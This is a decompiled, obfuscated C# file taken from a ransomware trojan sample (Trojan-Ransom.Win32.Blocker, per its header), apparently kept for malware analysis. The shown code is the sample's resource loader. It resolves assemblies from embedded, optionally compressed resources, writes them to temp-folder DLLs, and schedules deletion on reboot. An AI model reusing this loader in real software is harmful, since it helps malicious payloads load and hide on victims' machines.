// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5555, Version=0.0.0.0, Culture=neutral, PublicKeyToken=f1fbbd7db53bfdb4
// MVID: 0D11B329-2752-44F3-ACE5-4122455C2392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.arpc-0c7d5e5565ff7304f705e1aeb4d7e4e31ffcea64aa2ae579695a932615bbef73.exe

using \u0001;
using \u0006;
using \u0008;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0001
{
  internal sealed class \u0007
  {
    private static Hashtable \u0001;

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0002([In] string obj0, [In] string obj1, [In] int obj2);

    internal static void \u0002()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0007.\u0002);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex);
        throw;
      }
    }

    internal static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      \u0007.\u0001 obj;
      string base64String;
      char[] chArray;
      string[] strArray;
      string str1;
      bool flag1;
      bool flag2;
      int index1;
      int index2;
      int num1;
      string str2;
      Hashtable hashtable;
      Assembly assembly1;
      Stream manifestResourceStream;
      int length;
      byte[] numArray;
      Assembly assembly2;
      string path1;
      string path2;
      FileStream fileStream;
      string s;
      try
      {
        obj = new \u0007.\u0001(obj1.Name);
        s = obj.\u0002(false);
        base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
        if (true)
        {
          chArray = new char[1]{ ',' };
          strArray = "ezY4ZTJlZmJiLWM0ZjgtNDBmOC1hYjkxLWY3ODFmNjdiYzI1YX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{68e2efbb-c4f8-40f8-ab91-f781f67bc25a}".Split(chArray);
          str1 = string.Empty;
          flag1 = false;
          flag2 = false;
          index1 = 0;
          goto label_6;
        }
        else
          goto label_18;
label_3:
        int num2;
        if (num2 != 0)
        {
          str1 = strArray[index1 + 1];
          goto label_9;
        }
        else
          index1 += 2;
label_6:
        int num3 = index1;
        int num4 = strArray.Length;
        int num5 = num3;
label_7:
        int num6 = num4 - 1;
label_8:
        if (num5 < num6)
        {
          num2 = strArray[index1] == base64String ? 1 : 0;
          goto label_3;
        }
label_9:
        if (str1.Length == 0 && obj.\u0003.Length == 0)
          base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
        else
          goto label_16;
label_11:
        for (index2 = 0; index2 < strArray.Length - 1; index2 += 2)
        {
          if (strArray[index2] == base64String)
          {
            str1 = strArray[index2 + 1];
            break;
          }
        }
label_16:
        if (true)
        {
          if (str1.Length <= 0)
            goto label_43;
        }
        else
          goto label_11;
label_18:
        num5 = (int) str1[0];
        num4 = 0;
        if (num4 == 0)
        {
          if (num4 != 0)
          {
            num2 = num5;
            goto label_3;
          }
          else
          {
            if (num5 == 91)
            {
              num1 = str1.IndexOf(']');
              str2 = str1.Substring(1, num1 - 1);
              int num7 = str2.IndexOf('z');
              int num8 = 0;
              if (num8 != 0)
              {
                num6 = num8;
                num5 = num7;
                goto label_8;
              }
              else
              {
                flag1 = num7 >= num8;
                flag2 = str2.IndexOf('t') >= 0;
                str1 = str1.Substring(num1 + 1);
              }
            }
            Monitor.Enter((object) (hashtable = \u0007.\u0001));
            try
            {
label_25:
              int num9;
              for (int index3 = \u0007.\u0001.ContainsKey((object) str1) ? 1 : 0; index3 == 0; index3 = num9)
              {
                manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
                if (manifestResourceStream != null)
                {
                  length = (int) manifestResourceStream.Length;
                  numArray = new byte[length];
                  manifestResourceStream.Read(numArray, 0, length);
                  if (flag1)
                    numArray = \u0004.\u0002(numArray);
                  do
                  {
                    assembly2 = (Assembly) null;
                    if (!flag2)
                    {
                      try
                      {
                        assembly2 = Assembly.Load(numArray);
                      }
                      catch (FileLoadException ex)
                      {
                        flag2 = true;
                      }
                      catch (BadImageFormatException ex)
                      {
                        flag2 = true;
                      }
                    }
                    if (flag2)
                    {
                      try
                      {
                        path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                        Directory.CreateDirectory(path1);
                        path2 = path1 + obj.\u0001 + ".dll";
                        if (!File.Exists(path2))
                        {
                          fileStream = File.OpenWrite(path2);
                          fileStream.Write(numArray, 0, numArray.Length);
                          fileStream.Close();
                          \u0007.\u0002(path2, (string) null, 4);
                          \u0007.\u0002(path1, (string) null, 4);
                        }
                        assembly2 = Assembly.LoadFile(path2);
                      }
                      catch
                      {
                      }
                    }
                    num9 = -1;
                    if (num9 == 0)
                      goto label_25;
                  }
                  while (num9 == 0);
                  \u0007.\u0001[(object) str1] = (object) assembly2;
                  assembly1 = assembly2;
                  goto label_45;
                }
                else
                  goto label_43;
              }
              assembly1 = (Assembly) \u0007.\u0001[(object) str1];
            }
            finally
            {
              Monitor.Exit((object) hashtable);
            }
label_45:
            return assembly1;
          }
        }
        else
          goto label_7;
label_43:
        if (true)
          return (Assembly) null;
        goto label_9;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) obj,
          (object) s,
          (object) base64String,
          (object) strArray,
          (object) str1,
          (object) flag1,
          (object) flag2,
          (object) index1,
          (object) index2,
          (object) num1,
          (object) str2,
          (object) manifestResourceStream,
          (object) length,
          (object) numArray,
          (object) assembly2,
          (object) path1,
          (object) path2,
          (object) fileStream,
          (object) assembly1,
          (object) chArray,
          (object) hashtable,
          obj0,
          (object) obj1
        };
        \u0005.\u0002(ex, objArray);
        throw;
      }
    }

    public \u0007()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex, (object) this);
        throw;
      }
    }

    static \u0007()
    {
      try
      {
        \u0007.\u0001 = new Hashtable();
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex);
        throw;
      }
    }

    internal struct \u0001
    {
      public string \u0001;
      public Version \u0001;
      public string \u0002;
      public string \u0003;

      public string \u0002([In] bool obj0)
      {
        StringBuilder stringBuilder1;
        try
        {
          stringBuilder1 = new StringBuilder();
          stringBuilder1.Append(this.\u0001);
label_11:
          int num1 = obj0 ? 1 : 0;
          while (true)
          {
            if (num1 != 0)
            {
              int num2 = this.\u0001 != (Version) null ? 1 : 0;
              if (false)
                num1 = num2;
              else if (num2 == 0)
                goto label_4;
              else
                goto label_13;
            }
            else
              goto label_4;
          }
          goto label_5;
label_4:
          stringBuilder1.Append(", Culture=");
          num1 = 0;
label_5:
          if (num1 == 0)
          {
            while (true)
            {
              if (true)
              {
                if (true)
                {
                  stringBuilder1.Append(this.\u0002.Length == 0 ? "neutral" : this.\u0002);
                  stringBuilder1.Append(", PublicKeyToken=");
                  stringBuilder1.Append(this.\u0003.Length == 0 ? "null" : this.\u0003);
                  goto label_10;
                }
                else
                  goto label_11;
              }
            }
            goto label_13;
          }
label_10:
          return stringBuilder1.ToString();
label_13:
          stringBuilder1.Append(", Version=");
          stringBuilder1.Append((object) this.\u0001);
          goto label_4;
        }
        catch (Exception ex)
        {
          StringBuilder stringBuilder2 = stringBuilder1;
          // ISSUE: variable of a boxed type
          __Boxed<\u0007.\u0001> local1 = (ValueType) this;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) stringBuilder2, (object) local1, (object) local2);
          throw;
        }
      }

      public \u0001([In] string obj0)
      {
        char[] chArray1;
        string[] strArray1;
        int index;
        string str1;
        string str2;
        try
        {
          this.\u0001 = (Version) null;
          this.\u0002 = string.Empty;
          this.\u0003 = string.Empty;
          this.\u0001 = string.Empty;
          string str3 = obj0;
          chArray1 = new char[1]{ ',' };
          char[] chArray2 = chArray1;
          strArray1 = str3.Split(chArray2);
          for (index = 0; index < strArray1.Length; ++index)
          {
            str1 = strArray1[index];
            str2 = str1.Trim();
            if (str2.StartsWith("Version="))
              this.\u0001 = new Version(str2.Substring(8));
            else if (str2.StartsWith("Culture="))
            {
              this.\u0002 = str2.Substring(8);
              if (this.\u0002 == "neutral")
                this.\u0002 = string.Empty;
            }
            else if (str2.StartsWith("PublicKeyToken="))
            {
              this.\u0003 = str2.Substring(15);
              if (this.\u0003 == "null")
                this.\u0003 = string.Empty;
            }
            else
              this.\u0001 = str2;
          }
        }
        catch (Exception ex)
        {
          string str4 = str1;
          string str5 = str2;
          char[] chArray3 = chArray1;
          string[] strArray2 = strArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<\u0007.\u0001> local2 = (ValueType) this;
          string str6 = obj0;
          \u0005.\u0002(ex, (object) str4, (object) str5, (object) chArray3, (object) strArray2, (object) local1, (object) local2, (object) str6);
          throw;
        }
      }
    }
  }
}
